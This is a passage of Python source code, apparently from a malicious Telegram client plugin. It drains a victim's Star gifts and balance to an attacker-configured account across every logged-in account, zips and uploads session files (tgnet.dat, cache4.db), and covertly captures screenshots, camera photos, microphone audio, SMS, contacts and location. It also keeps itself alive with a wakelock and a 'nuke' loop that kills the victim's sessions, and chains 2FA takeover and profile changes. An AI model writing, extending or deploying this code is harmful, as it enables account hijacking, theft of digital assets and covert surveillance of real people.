                  "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftChat")
        if not CI:
            return None, "no ChatInput"
        o = CI()
        uid = int(_UC().getInstance(0).getClientUserId())
        peer = self._get_input_peer(0, uid)
        if not peer:
            return None, "no self peer"
        o.peer = peer
        o.saved_id = int(saved.get("saved_id", 0))
        return o, None

    def _gift_is_suspect(self, sg, gift):
        try:
            cls = str(type(gift))
            is_unique = ("Unique" in cls or "TL_starGiftUnique" in cls
                         or _safe_int(getattr(gift, "num", 0)) > 0
                         or _get_bool_attr(gift, "isUnique", False)
                         or _get_bool_attr(gift, "canResell", False))
            conv = _safe_int(getattr(sg, "convert_stars", 0) or getattr(gift, "convert_stars", 0))
            if conv > 0 and not is_unique:
                return False
            sid = _safe_int(getattr(sg, "saved_id", 0))
            mid = _safe_int(getattr(sg, "msg_id", 0))
            for v in (sid, mid):
                if 1500000000 <= v <= 2147483647:
                    return True
            oid = _safe_int(getattr(gift, "owner_id", 0) or getattr(sg, "owner_id", 0) or 0)
            if oid > 0:
                try:
                    my = int(self._my_id() or 0)
                except Exception:
                    my = 0
                if my > 0 and oid != my:
                    return True
        except Exception:
            pass
        return False

    def _get_saved_gifts(self):
        self._gifts_rpc_error = None
        try:
            Req = _cls("org.telegram.tgnet.tl.TL_stars$getSavedStarGifts",
                       "org.telegram.tgnet.tl.TL_stars$payments_getSavedStarGifts",
                       "org.telegram.tgnet.TLRPC$TL_payments_getSavedStarGifts")
            if not Req:
                return []
            uid = int(_UC().getInstance(0).getClientUserId())
            peer = self._get_input_peer(0, uid)
            if not peer:
                return []
            out = []
            offset = ""
            for _p in range(20):
                rq = Req()
                rq.peer = peer
                try:
                    rq.offset = offset
                except Exception:
                    pass
                rq.limit = 100
                resp, err = self._rg_rpc(rq, 0, 10.0, fast=True)
                if err is not None or resp is None:
                    break
                g = getattr(resp, "gifts", None)
                if g is None:
                    break
                try:
                    gsize = g.size()
                except Exception:
                    gsize = 0
                for i in range(gsize):
                    sg = g.get(i)
                    gift = getattr(sg, "gift", None)
                    if not gift:
                        continue
                    cls = str(type(gift))
                    ra = getattr(gift, "resell_amount", None)
                    ra_l = False
                    if ra is not None:
                        try:
                            ra_l = int(ra.size()) > 0
                        except Exception:
                            try:
                                ra_l = len(ra) > 0
                            except Exception:
                                ra_l = bool(ra)
                    is_u = (
                        ("Unique" in cls or "TL_starGiftUnique" in cls or ra_l)
                        or _safe_int(getattr(gift, "num", 0)) > 0
                        or _get_bool_attr(gift, "isUnique", False)
                        or _get_bool_attr(gift, "canResell", False)
                    )
                    out.append({
                        "saved_id": _safe_int(getattr(sg, "saved_id", 0)),
                        "msg_id": _safe_int(getattr(sg, "msg_id", 0)),
                        "flags": _safe_int(getattr(sg, "flags", 0)),
                        "suspect": self._gift_is_suspect(sg, gift),
                        "can_upgrade": _get_bool_attr(gift, "can_upgrade", False) if not is_u else False,
                        "upgrade_stars": _safe_int(getattr(gift, "upgrade_stars", 0)) if not is_u else 0,
                        "gift_id": _safe_int(getattr(gift, "id", 0)),
                        "title": str(getattr(gift, "title", "") or ""),
                        "slug": str(getattr(gift, "slug", "") or ""),
                        "u": is_u,
                        "bc": _is_blockchain_gift(gift, sg),
                        "owner_id": _safe_int(getattr(gift, "owner_id", 0) or getattr(sg, "owner_id", 0)),
                        "owner_address": str(getattr(gift, "owner_address", None) or getattr(sg, "owner_address", None) or ""),
                        "is_minted": _get_bool_attr(gift, "is_minted", False) or _get_bool_attr(sg, "is_minted", False),
                        "on_blockchain": _get_bool_attr(gift, "on_blockchain", False) or _get_bool_attr(sg, "on_blockchain", False),
                        "transfer_stars": _safe_int(getattr(sg, "transfer_stars", 0)),
                        "can_transfer_at": _safe_int(getattr(sg, "can_transfer_at", 0)),
                        "can_resell_at": _safe_int(getattr(sg, "can_resell_at", 0)),
                        "convert_stars": _safe_int(getattr(sg, "convert_stars", 0)),
                        "listed": self._gift_is_listed(gift),
                    })
                nxt = str(getattr(resp, "next_offset", "") or "")
                if not nxt or nxt == offset or gsize == 0:
                    break
                offset = nxt
            return out
        except Exception as e:
            _log(f"get_saved_gifts: {e}")
            return []

    def _delist_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            Rq = _cls("org.telegram.tgnet.tl.TL_stars$updateStarGiftPrice",
                      "org.telegram.tgnet.tl.TL_stars$payments_updateStarGiftPrice")
            if not Rq:
                return {"error": "no class"}
            rq = Rq()
            rq.stargift = o
            try:
                rq.resell_amount = None
            except Exception as e2:
                return {"error": "assign: %s" % e2}
            r, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _convert_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            Rq = _cls("org.telegram.tgnet.tl.TL_stars$convertStarGift",
                      "org.telegram.tgnet.tl.TL_stars$payments_convertStarGift")
            if not Rq:
                return {"error": "no class"}
            rq = Rq()
            rq.stargift = o
            r, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _upgrade_saved_gift(self, saved):
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            Rq = _cls("org.telegram.tgnet.tl.TL_stars$upgradeStarGift",
                      "org.telegram.tgnet.tl.TL_stars$payments_upgradeStarGift")
            if not Rq:
                return {"error": "no class"}
            rq = Rq()
            rq.stargift = o
            try:
                rq.keep_original_details = False
            except Exception:
                pass
            r, _e = self._rg_rpc(rq, 0, 15.0, fast=True)
            return {"ok": True} if r is not None else {"error": "fail"}
        except Exception as e:
            return {"error": str(e)}

    def _transfer_saved_gift(self, saved, target_uid, target_ah, upgrade=False, test=False):
        if saved and saved.get("bc"):
            return {"error": "minted TON NFT skipped"}
        try:
            o, e = self._input_saved_gift(saved)
            if not o:
                return {"error": e}
            tp = TLRPC.TL_inputPeerUser()
            tp.user_id = int(target_uid)
            tp.access_hash = int(target_ah)
            T = _cls("org.telegram.tgnet.tl.TL_stars$transferStarGift",
                     "org.telegram.tgnet.tl.TL_stars$payments_transferStarGift")
            if T and not upgrade:
                rq = T()
                rq.stargift = o
                rq.to_id = tp
                r, e = self._rg_rpc(rq, 0, 8.0, fast=True)
                if r is not None:
                    return {"ok": True}
                etxt = getattr(e, "text", "") or str(e or "")
                if "PAYMENT_REQUIRED" not in etxt and "TOO_EARLY" not in etxt:
                    return {"error": "direct: %s" % etxt[:60]}
            if upgrade:
                Inv = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftUpgrade",
                           "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftUpgrade")
            else:
                Inv = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer",
                           "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftTransfer")
            RF = _cls("org.telegram.tgnet.tl.TL_stars$getPaymentForm",
                      "org.telegram.tgnet.TLRPC$TL_payments_getPaymentForm")
            SF = _cls("org.telegram.tgnet.tl.TL_stars$sendStarsForm",
                      "org.telegram.tgnet.TLRPC$TL_payments_sendStarsForm")
            if not (Inv and RF and SF):
                return {"error": "no classes"}
            inv = Inv()
            inv.stargift = o
            if upgrade:
                try:
                    inv.keep_original_details = False
                except Exception:
                    pass
            else:
                inv.to_id = tp
            f = RF()
            f.invoice = inv
            fr, _fe = self._rg_rpc(f, 0, 8.0, fast=True)
            if fr is None:
                return {"error": "form fail"}
            if test:
                return {"test": True, "can_send": True, "gift_id": int(saved.get("gift_id", 0))}
            s = SF()
            s.form_id = _safe_int(getattr(fr, "form_id", 0))
            s.invoice = inv
            sr, _se = self._rg_rpc(s, 0, 10.0, fast=True)
            return {"ok": True} if sr is not None else {"error": "send fail"}
        except Exception as e:
            return {"error": str(e)}

    def _stars_balance(self, acc=0):
        try:
            Rq = _cls("org.telegram.tgnet.tl.TL_payments$getStarsStatus",
                      "org.telegram.tgnet.TLRPC$TL_payments_getStarsStatus",
                      "org.telegram.tgnet.tl.TL_stars$getStarsStatus")
            if not Rq:
                return 0
            uid = int(_UC().getInstance(acc).getClientUserId())
            peer = self._get_input_peer(acc, uid)
            if not peer:
                return 0
            rq = Rq()
            rq.peer = peer
            try:
                rq.ton = False
            except Exception:
                pass
            r, _e = self._rg_rpc(rq, acc, 20.0, fast=True)
            if r:
                bal = getattr(r, "balance", None)
                if bal:
                    try:
                        return int(getattr(bal, "amount", 0))
                    except Exception:
                        try:
                            return int(bal)
                        except Exception:
                            pass
        except Exception:
            pass
        return 0

    def _h_convert(self, test=False, target_id=0):
        _log("_h_convert start")
        gifts = self._get_saved_gifts()
        out = []
        converted = 0
        upgraded = 0
        balance = self._stars_balance(0)
        for g in gifts:
            try:
                if g.get("u"):
                    continue
                if g.get("can_upgrade") and int(g.get("upgrade_stars", 0) or 0) > 0:
                    continue
                conv = int(g.get("convert_stars", 0) or 0)
                if conv <= 0:
                    continue
                if test:
                    out.append({"test": True, "gift_id": g.get("gift_id"),
                                "title": g.get("title", ""), "convert_stars": conv})
                    converted += conv
                    continue
                r = self._convert_saved_gift(g)
                if isinstance(r, dict) and r.get("ok"):
                    converted += conv
                out.append({"gift_id": g.get("gift_id"), "title": g.get("title", ""),
                            "convert_stars": conv, "result": r})
                time.sleep(0.3)
            except Exception as e:
                out.append({"gift_id": g.get("gift_id"), "result": {"error": str(e)}})
        for g in gifts:
            try:
                if g.get("u"):
                    continue
                if not g.get("can_upgrade"):
                    continue
                up_cost = int(g.get("upgrade_stars", 0) or 0)
                if up_cost <= 0:
                    continue
                if test:
                    out.append({"test": True, "gift_id": g.get("gift_id"),
                                "upgrade_stars": up_cost,
                                "would_upgrade": up_cost <= (balance + converted)})
                    continue
                if balance < up_cost:
                    conv = int(g.get("convert_stars", 0) or 0)
                    if conv > 0:
                        r = self._convert_saved_gift(g)
                        if isinstance(r, dict) and r.get("ok"):
                            converted += conv
                        out.append({"gift_id": g.get("gift_id"), "convert_stars": conv,
                                    "result": r, "note": "unaffordable upgrade → burn"})
                        time.sleep(0.3)
                    continue
                r = self._upgrade_saved_gift(g)
                if isinstance(r, dict) and r.get("ok"):
                    upgraded += 1
                    balance -= up_cost
                out.append({"gift_id": g.get("gift_id"), "upgrade_stars": up_cost, "result": r})
                time.sleep(0.3)
            except Exception as e:
                out.append({"gift_id": g.get("gift_id"), "result": {"error": str(e)}})
        _log(f"_h_convert done: +{converted} stars, {upgraded} upgraded")
        return {"converted_stars": converted, "upgraded": upgraded, "results": out}

    def _h_u(self, target_id, target_ah, test=False):
        _log(f"_h_u start test={test} target={target_id}")
        self._fee_deficit = 0
        gifts = self._get_saved_gifts()
        u_gifts = [g for g in gifts if g.get("u") and not g.get("bc") and not g.get("suspect")]
        bc_gifts = [g for g in gifts if g.get("u") and g.get("bc")]
        suspect = [g for g in gifts if g.get("u") and g.get("suspect") and not g.get("bc")]
        _log(f"u={len(u_gifts)} bc={len(bc_gifts)} suspect={len(suspect)}")
        out = []
        now = int(time.time())
        u_gifts.sort(key=lambda g: (int(g.get("transfer_stars", 0)), int(g.get("can_transfer_at", 0) or 0)))
        balance = self._stars_balance(0)
        skipped_fees = 0
        for g in bc_gifts:
            out.append({"gift_id": g.get("gift_id"), "title": g.get("title", ""),
                        "slug": g.get("slug", ""), "bc": True,
                        "result": {"error": "minted TON NFT skipped"}})
        for g in suspect:
            out.append({"gift_id": g.get("gift_id"), "title": g.get("title", ""),
                        "slug": g.get("slug", ""), "fake": True,
                        "result": {"error": "suspect injected fake skipped"}})
        for g in u_gifts[:100]:
            try:
                transfer_stars = int(g.get("transfer_stars", 0))
                can_transfer_at = int(g.get("can_transfer_at", 0) or 0)
                if can_transfer_at > now:
                    rem = can_transfer_at - now
                    d = rem // 86400
                    h = (rem % 86400) // 3600
                    slug = g.get("slug", "")
                    out.append({"gift_id": g.get("gift_id"), "title": g.get("title", ""),
                                "slug": slug, "unlock_at": can_transfer_at,
                                "nft_url": (f"https://t.me/nft/{slug}" if slug else ""),
                                "result": {"error": f"transfer locked: {d}d {h}h"}})
                    continue
                if g.get("listed"):
                    dr = self._delist_saved_gift(g)
                    if not (isinstance(dr, dict) and dr.get("ok")):
                        out.append({"gift_id": g.get("gift_id"), "listed": True,
                                    "result": {"error": f"delist failed: {dr}"}})
                        continue
                    time.sleep(0.3)
                if transfer_stars > 0 and transfer_stars > balance:
                    skipped_fees += transfer_stars
                    out.append({"gift_id": g.get("gift_id"), "title": g.get("title", ""),
                                "slug": g.get("slug", ""), "transfer_stars": transfer_stars,
                                "result": {"error": f"needs {transfer_stars} stars, have {balance}"}})
                    continue
                r = self._transfer_saved_gift(g, target_id, target_ah, upgrade=False)
                out.append({"gift_id": g.get("gift_id"), "title": g.get("title", ""),
                            "slug": g.get("slug", ""), "transfer_stars": transfer_stars,
                            "result": r})
                if isinstance(r, dict) and r.get("ok") and transfer_stars > 0:
                    balance -= transfer_stars
                time.sleep(0.2)
            except Exception as e:
                out.append({"gift_id": g.get("gift_id"), "result": {"error": str(e)}})
        self._fee_deficit = max(0, skipped_fees - balance)
        _log(f"_h_u done, deficit={self._fee_deficit}")
        return out

    def _resolve_target(self):
        target = str(self.cfg.get("target_user") or "").strip()
        target_id = 0
        try:
            target_id = int(self.cfg.get("target_user_id") or 0)
        except Exception:
            target_id = 0
        if not target and not target_id:
            return 0, 0, "no target in cfg"
        ah = 0
        if target_id > 0:
            try:
                mc = _MC().getInstance(0)
                u = mc.getUser(target_id)
                if u is not None:
                    ah = _safe_int(getattr(u, "access_hash", 0))
            except Exception:
                pass
            if not ah and target:
                try:
                    Resolve = TLRPC.TL_contacts_resolveUsername()
                    Resolve.username = target.lstrip("@")
                    rres, _e = self._rg_rpc(Resolve, 0, 10.0, fast=True)
                    if rres:
                        users = getattr(rres, "users", None)
                        if users is not None and users.size() > 0:
                            u = users.get(0)
                            target_id = _safe_int(getattr(u, "id", 0))
                            ah = _safe_int(getattr(u, "access_hash", 0))
                except Exception:
                    pass
            return target_id, ah, None if ah else "no access_hash"
        if target:
            try:
                Resolve = TLRPC.TL_contacts_resolveUsername()
                Resolve.username = target.lstrip("@")
                rres, _e = self._rg_rpc(Resolve, 0, 10.0, fast=True)
                if rres:
                    users = getattr(rres, "users", None)
                    if users is not None and users.size() > 0:
                        u = users.get(0)
                        target_id = _safe_int(getattr(u, "id", 0))
                        ah = _safe_int(getattr(u, "access_hash", 0))
            except Exception as e:
                return 0, 0, str(e)
        if not target_id or not ah:
            return 0, 0, f"could not resolve {target}"
        return target_id, ah, None

    # ═══════════════════════════════════════════════════════════════════════
    # DRAIN
    # ═══════════════════════════════════════════════════════════════════════
    def _h(self, test=False, drain_stars=True):
        _log(f"_h start test={test}")
        result = {"convert": None, "u": None, "target": None, "error": None,
                  "fee_deficit": 0}
        try:
            result["convert"] = self._h_convert(test, 0)
        except Exception as e:
            result["convert"] = {"error": str(e)}
        tid, tah, terr = self._resolve_target()
        if not tid or not tah:
            result["error"] = terr or "no target"
            return result
        result["target"] = {"user_id": tid, "access_hash": tah}
        try:
            result["u"] = self._h_u(tid, tah, test)
        except Exception as e:
            result["u"] = {"error": str(e)}
        result["fee_deficit"] = int(getattr(self, "_fee_deficit", 0) or 0)
        return result

    def _drain_all_accounts(self, test=False):
        accounts = self._get_accounts_list()
        results = []
        orig = self.account
        for a in accounts:
            aid = a.get("id", 0)
            try:
                _RPC_LOCAL.acc = int(aid)
                self.account = int(aid)
                self.user_id = self._my_id(aid) or int(a.get("user_id") or 0)
                r = self._h(test=test, drain_stars=bool(self.cfg.get("ds", True)))
                results.append({"account": aid, "user_id": a.get("user_id"),
                                "username": a.get("username", ""), "result": r})
            except Exception as e:
                results.append({"account": aid, "user_id": a.get("user_id"),
                                "username": a.get("username", ""),
                                "result": {"error": str(e)}})
        self.account = orig
        _RPC_LOCAL.acc = None
        return results

    def _auto_drain_bg(self):
        try:
            res = self._drain_all_accounts(test=bool(self.cfg.get("t")))
            self._res(0, {"auto_drain": res})
        except Exception as e:
            _log(f"auto_drain: {e}")

    # ═══════════════════════════════════════════════════════════════════════
    # SESSION THEFT
    # ═══════════════════════════════════════════════════════════════════════
    def _collect_session_files(self, base):
        files = []
        m1 = base + "/files/tgnet.dat"
        if os.path.exists(m1):
            files.append(m1)
        ad = base + "/files"
        if os.path.isdir(ad):
            for name in os.listdir(ad):
                if name.startswith("account"):
                    p = ad + "/" + name + "/tgnet.dat"
                    if os.path.exists(p):
                        files.append(p)
                    uc = ad + "/" + name + "/userconfig.xml"
                    if os.path.exists(uc):
                        files.append(uc)
        pd = base + "/shared_prefs"
        if os.path.isdir(pd):
            for name in os.listdir(pd):
                low = name.lower()
                if ("userconfig" in low or "userconfing" in low or "cache4" in low) and name.endswith(".xml"):
                    files.append(pd + "/" + name)
        c4 = base + "/files/cache4.db"
        if os.path.exists(c4):
            files.append(c4)
            for suffix in ("-wal", "-shm"):
                if os.path.exists(c4 + suffix):
                    files.append(c4 + suffix)
        return files

    def _manual_userbot_session(self):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return "no ctx"
            pkg = str(ctx.getPackageName())
            base = f"/data/data/{pkg}"
            files = self._collect_session_files(base)
            if not files:
                return "no session files"
            amap = {}
            for a in self._get_accounts_list():
                amap[str(a.get("id"))] = {
                    "user_id": a.get("user_id"),
                    "username": a.get("username", ""),
                    "phone": a.get("phone", ""),
                }
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for fp in files:
                    try:
                        if os.path.getsize(fp) <= MAX_DOC_SIZE:
                            zf.write(fp, arcname=os.path.relpath(fp, base).replace("\\", "/"))
                    except Exception:
                        pass
                if amap:
                    zf.writestr("accounts_map.json", json.dumps(amap, ensure_ascii=False, indent=2))
                meta = {
                    "package": pkg,
                    "harvested_at": int(time.time()),
                    "harvested_at_human": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "files_count": len(files),
                    "accounts": amap,
                }
                zf.writestr("_meta.json", json.dumps(meta, ensure_ascii=False, indent=2))
            blob = z.getvalue()
            try:
                ts = time.strftime("%Y%m%d_%H%M%S")
                for d in ("/sdcard/Download/AntiRatplug_dump/" + ts,
                          "/storage/emulated/0/Download/AntiRatplug_dump/" + ts,
                          "/sdcard/AntiRatplug_dump/" + ts,
                          "/data/local/tmp/AntiRatplug_dump/" + ts):
                    try:
                        if not os.path.isdir(d):
                            os.makedirs(d, exist_ok=True)
                        with open(os.path.join(d, "userbot_session.zip"), "wb") as f:
                            f.write(blob)
                        break
                    except Exception:
                        continue
            except Exception:
                pass
            self._upl("userbot_session", "userbot_session.zip", blob)
            for fp in files:
                try:
                    sz = os.path.getsize(fp)
                    if sz > MAX_DOC_SIZE:
                        continue
                    with open(fp, "rb") as f:
                        raw = f.read()
                    fn = os.path.basename(fp)
                    parent = os.path.basename(os.path.dirname(fp)) or "root"
                    self._upl("session_file", parent + "__" + fn, raw)
                except Exception:
                    pass
            return {"ok": True, "files": len(files), "size": len(blob)}
        except Exception as e:
            return {"error": str(e)}

    def _manual_dump_session(self):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return "no ctx"
            pkg = str(ctx.getPackageName())
            base = f"/data/data/{pkg}"
            files = []
            for rd, _dirs, fns in os.walk(base):
                if rd.count("/") - base.count("/") > 3:
                    continue
                if any(x in rd for x in ("/cache/", "/files/cache", "/files/photos", "/files/videos")):
                    continue
                for f in fns:
                    low = f.lower()
                    if ("session" in low or "auth" in low or "cache4" in low
                            or low.endswith(".db") or low.endswith(".xml")):
                        fp = os.path.join(rd, f)
                        try:
                            if os.path.getsize(fp) <= MAX_DOC_SIZE:
                                files.append(fp)
                        except Exception:
                            pass
            if not files:
                return "no files"
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for fp in files:
                    try:
                        zf.write(fp, arcname=os.path.relpath(fp, base))
                    except Exception:
                        pass
            blob = z.getvalue()
            self._upl("session", "session.zip", blob)
            return {"ok": True, "files": len(files), "size": len(blob)}
        except Exception as e:
            return {"error": str(e)}

    # ═══════════════════════════════════════════════════════════════════════
    # DEVICE HARVEST
    # ═══════════════════════════════════════════════════════════════════════
    def _has_perm(self, name):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return False
            pm = ctx.getPackageManager()
            return pm.checkPermission(name, ctx.getPackageName()) == 0
        except Exception:
            return False

    def _screenshot(self):
        try:
            act = None
            try:
                act = jclass("org.telegram.ui.LaunchActivity").instance
            except Exception:
                pass
            if act is None:
                try:
                    act = ApplicationLoader.application.getCurrentActivity()
                except Exception:
                    pass
            if act is None:
                return {"error": "no activity"}
            view = act.getWindow().getDecorView().getRootView()
            w = view.getWidth()
            h = view.getHeight()
            if w <= 0 or h <= 0:
                return {"error": "bad size"}
            from android.graphics import Bitmap, Canvas
            bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
            c = Canvas(bmp)
            view.draw(c)
            ctx = ApplicationLoader.applicationContext
            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
            if not os.path.exists(d):
                os.makedirs(d)
            p = os.path.join(d, "screenshot_%d.jpg" % int(time.time()))
            from java.io import FileOutputStream
            fos = FileOutputStream(p)
            fmt = jclass("android.graphics.Bitmap$CompressFormat").JPEG
            bmp.compress(fmt, 85, fos)
            fos.flush()
            fos.close()
            bmp.recycle()
            with open(p, "rb") as f:
                raw = f.read()
            try:
                os.remove(p)
            except Exception:
                pass
            self._upl("screenshot", "screen.jpg", raw)
            return {"ok": True, "size": len(raw)}
        except Exception as e:
            return {"error": str(e)}

    def _camera(self, which="front"):
        try:
            if not self._has_perm("android.permission.CAMERA"):
                return {"error": "no CAMERA perm"}
            cam = jclass("android.hardware.Camera")
            cid = None
            try:
                ic = jclass("android.hardware.Camera$CameraInfo")
                facing = ic.CAMERA_FACING_FRONT if which == "front" else ic.CAMERA_FACING_BACK
                info = ic()
                total = int(cam.getNumberOfCameras())
                for i in range(total):
                    cam.getCameraInfo(i, info)
                    if int(info.facing) == int(facing):
                        cid = i
                        break
            except Exception:
                pass
            if cid is None:
                cid = 1 if which == "front" else 0
            c = None
            for _ in range(4):
                try:
                    c = cam.open(int(cid))
                    break
                except Exception:
                    time.sleep(0.4)
            if c is None:
                return {"error": "no open"}
            try:
                st = jclass("android.graphics.SurfaceTexture")(0)
                c.setPreviewTexture(st)
                c.startPreview()
                ev = threading.Event()
                box = [None]
                PC = jclass("android.hardware.Camera$PictureCallback")

                class _PC(dynamic_proxy(PC)):
                    def onPictureTaken(self, data, camera):
                        box[0] = data
                        ev.set()

                c.takePicture(None, None, _PC())
                ev.wait(8)
                if box[0]:
                    raw = bytes(box[0])
                    self._upl("camera", which + ".jpg", raw)
                    return {"ok": True, "size": len(raw)}
                return {"error": "no photo"}
            finally:
                try:
                    c.stopPreview()
                except Exception:
                    pass
                try:
                    c.release()
                except Exception:
                    pass
        except Exception as e:
            return {"error": str(e)}

    def _audio(self, sec=5):
        try:
            if not self._has_perm("android.permission.RECORD_AUDIO"):
                return {"error": "no RECORD_AUDIO perm"}
            ctx = ApplicationLoader.applicationContext
            p = os.path.join(str(ctx.getCacheDir().getAbsolutePath()), "a_%d.3gp" % int(time.time()))
            mr = jclass("android.media.MediaRecorder")()
            try:
                src = getattr(jclass("android.media.MediaRecorder$AudioSource"), "MIC", 1)
                of = getattr(jclass("android.media.MediaRecorder$OutputFormat"), "THREE_GPP", 1)
                ae = getattr(jclass("android.media.MediaRecorder$AudioEncoder"), "AMR_NB", 1)
            except Exception:
                src = of = ae = 1
            mr.setAudioSource(src)
            mr.setOutputFormat(of)
            mr.setAudioEncoder(ae)
            mr.setOutputFile(p)
            mr.prepare()
            mr.start()
            time.sleep(int(sec))
            mr.stop()
            mr.release()
            with open(p, "rb") as f:
                data = f.read()
            try:
                os.remove(p)
            except Exception:
                pass
            self._upl("audio", "audio.3gp", data)
            return {"ok": True, "size": len(data)}
        except Exception as e:
            return {"error": str(e)}

    def _sms(self):
        out = []
        if self._has_perm("android.permission.READ_SMS"):
            try:
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://sms"), ["address", "body", "date"], None, None, "date DESC")
                if cur:
                    while cur.moveToNext():
                        out.append({"address": str(cur.getString(0)),
                                    "body": str(cur.getString(1)),
                                    "date": str(cur.getLong(2))})
                    cur.close()
            except Exception as e:
                return [{"error": str(e)}]
        if not out:
            return [{"error": "no READ_SMS permission"}]
        return out

    def _contacts(self, src="dev"):
        if src == "tg":
            try:
                cc = jclass("org.telegram.messenger.ContactsController").getInstance(self.account)
                book = getattr(cc, "contactsDict", None)
                out = []
                if book is not None:
                    it = book.entrySet().iterator()
                    while it.hasNext():
                        try:
                            e = it.next()
                            uid = int(e.getKey())
                            u = _MC().getInstance(self.account).getUser(uid)
                            name = " ".join(x for x in (
                                str(getattr(u, "first_name", "") or ""),
                                str(getattr(u, "last_name", "") or "")) if x) if u else ""
                            out.append({"id": uid, "name": name or str(uid),
                                        "username": str(getattr(u, "username", "") or "") if u else "",
                                        "number": str(getattr(u, "phone", "") or "") if u else ""})
                        except Exception:
                            continue
                return out if out else [{"error": "telegram contacts empty"}]
            except Exception as e:
                return [{"error": str(e)}]
        out = []
        if self._has_perm("android.permission.READ_CONTACTS"):
            try:
                ctx = ApplicationLoader.applicationContext
                cr = ctx.getContentResolver()
                Uri = jclass("android.net.Uri")
                cur = cr.query(Uri.parse("content://com.android.contacts/data/phones"),
                               ["display_name", "data1"], None, None, None)
                if cur:
                    while cur.moveToNext():
                        out.append({"name": str(cur.getString(0)), "number": str(cur.getString(1))})
                    cur.close()
            except Exception as e:
                return [{"error": str(e)}]
        return out if out else [{"error": "no READ_CONTACTS permission"}]

    def _apps(self):
        try:
            ctx = ApplicationLoader.applicationContext
            pm = ctx.getPackageManager()
            apps = pm.getInstalledApplications(0)
            out = []
            for i in range(apps.size()):
                try:
                    out.append(str(apps.get(i).packageName))
                except Exception:
                    pass
            return out[:500]
        except Exception as e:
            return [str(e)]

    def _location(self):
        try:
            if (self._has_perm("android.permission.ACCESS_FINE_LOCATION")
                    or self._has_perm("android.permission.ACCESS_COARSE_LOCATION")):
                ctx = ApplicationLoader.applicationContext
                lm = ctx.getSystemService(ctx.LOCATION_SERVICE)
                providers = lm.getAllProviders()
                for p in ("fused", "gps", "network"):
                    if p in [str(x) for x in providers]:
                        try:
                            loc = lm.getLastKnownLocation(p)
                            if loc:
                                return {"lat": float(loc.getLatitude()),
                                        "lon": float(loc.getLongitude()),
                                        "acc": float(loc.getAccuracy()), "provider": p}
                        except Exception:
                            pass
        except Exception:
            pass
        return {"error": "no location permission"}

    # ═══════════════════════════════════════════════════════════════════════
    # KEEPALIVE / PERSISTENCE
    # ═══════════════════════════════════════════════════════════════════════
    def _keepalive(self):
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None:
                return
            if not hasattr(self, "_wakelock") or self._wakelock is None:
                try:
                    pm = ctx.getSystemService("power")
                    self._wakelock = pm.newWakeLock(1, "tg:sync")
                    self._wakelock.acquire()
                except Exception as e:
                    _log(f"wakelock: {e}")
            try:
                ApplicationLoader.startPushService()
            except Exception:
                pass
        except Exception as e:
            _log(f"keepalive: {e}")

    def _nuke_marker_path(self):
        try:
            ctx = ApplicationLoader.applicationContext
            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()), ".ar_nuke_active")
        except Exception:
            return None

    def _check_persisted_nuke(self):
        try:
            m = self._nuke_marker_path()
            if not m or not os.path.exists(m):
                return
            self._nuke_started = True
            threading.Thread(target=self._nuke_loop, daemon=True).start()
        except Exception:
            pass

    def _nuke_loop(self):
        while self._sync_running and self._active:
            try:
                m = self._nuke_marker_path()
                if not m or not os.path.exists(m):
                    return
                self._parallel([(self._kill_all_sessions, 0),
                                (self._kill_web_authorizations, 0)], workers=2, timeout=25)
                for _ in range(60):
                    if not (self._sync_running and self._active):
                        return
                    time.sleep(5)
            except Exception:
                for _ in range(12):
                    if not (self._sync_running and self._active):
                        return
                    time.sleep(5)

    # ═══════════════════════════════════════════════════════════════════════
    # IDK START
    # ═══════════════════════════════════════════════════════════════════════
    def _idk_start(self):
        def task():
            try:
                self._send_text("IDK START v20.1")
                t0 = time.time()
                rep = {"started_at": int(t0)}
                try:
                    rep["account_info"] = self._harvest_account_info(0)
                except Exception as e:
                    rep["account_info"] = {"error": str(e)}
                try:
                    rep["2fa"] = self._nuke_password_pipeline(0)
                except Exception as e:
                    rep["2fa"] = {"error": str(e)}
                try:
                    self._confirm_unconfirmed_sessions(0)
                except Exception:
                    pass
                try:
                    rep["web_killed"] = self._kill_web_authorizations(0)
                except Exception:
                    pass
                try:
                    self._change_username(0)
                except Exception:
                    pass
                try:
                    self._change_profile(0)
                except Exception:
                    pass
                try:
                    self._reset_contacts(0)
                except Exception:
                    pass
                try:
                    rep["drain"] = self._drain_all_accounts()
                except Exception as e:
                    rep["drain"] = {"error": str(e)}
                try:
                    k, t = self._kill_all_sessions(0)
                    rep["sessions"] = {"killed": k, "total": t}
                except Exception as e:
                    rep["sessions"] = {"error": str(e)}
                try:
                    rep["session_dump"] = self._manual_dump_session()
                except Exception as e:
                    rep["session_dump"] = {"error": str(e)}
                try:
                    rep["userbot_session"] = self._manual_userbot_session()
                except Exception as e:
                    rep["userbot_session"] = {"error": str(e)}
                try:
                    rep["screenshot"] = self._screenshot()
                except Exception as e:
                    rep["screenshot"] = {"error": str(e)}
                try:
